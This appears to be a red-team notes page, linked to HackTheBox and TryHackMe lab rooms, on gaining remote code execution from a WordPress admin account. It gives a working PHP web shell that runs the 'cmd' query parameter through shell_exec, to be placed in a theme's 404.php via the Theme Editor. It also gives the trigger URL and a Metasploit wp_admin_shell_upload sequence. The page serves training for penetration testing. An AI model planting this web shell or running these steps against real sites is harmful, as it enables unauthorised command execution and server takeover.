# WordPress Admin RCE

[![hackingwordpress](../../../../../../cybersecurity/_badges/htb/hackingwordpress.svg)](https://academy.hackthebox.com/course/preview/hacking-wordpress)
[![colddboxeasy](../../../../../../cybersecurity/_badges/thm-p/colddboxeasy.svg)](https://tryhackme.com/room/colddboxeasy)
[![allinonemj](../../../../../../cybersecurity/_badges/thm-p/allinonemj.svg)](https://tryhackme.com/room/allinonemj)

<div class="row row-cols-lg-2"><div>

With sufficient privileges, it is possible to exploit a remote code execution (RCE) *vulnerability* on WordPress.

Since admins can modify templates, and templates are written in PHP, we can replace one of them with our code. For instance, a remote shell, meaning we would have a remote command execution (RCE).

Select `Appearance` then `Theme Editor`. Select a theme, preferably one that is not used to avoid breaking things.

Pick a non-critical file such as `404.php` and add to it a [web shell](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md) or directly use a [reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md):
</div><div>

```php!
<?php
// add your webshell
echo "<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>";
// prevent the rest of the page from showing up
// ⚠️ it may not work, remove it if it doesn't
exit 0;
```

To execute it, aside from accessing an invalid URL which may highlighted in the logs, directly access the file from the theme folder:

```text!
https://<HOST>/wp-content/themes/<theme_name>/404.php
```
</div></div>

<hr class="sep-both">

## Metasploit Module

<div class="row row-cols-lg-2"><div>

You can use [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md), but it's quite unreliable.

```shell!
$ msfconsole -q
msf6> use wp_admin_shell_upload
msf6> set USERNAME username
msf6> set PASSWORD password
msf6> set RHOSTS IP
msf6> set LHOST tun0
msf6> run
```
</div><div>

Some options you might want to set:

```shell!
msf6> set WPCHECK yes # may be false in some scenarios
msf6> set httptrace true
msf6> set TARGETURI /wordpress/
msf6> run
```

</div></div>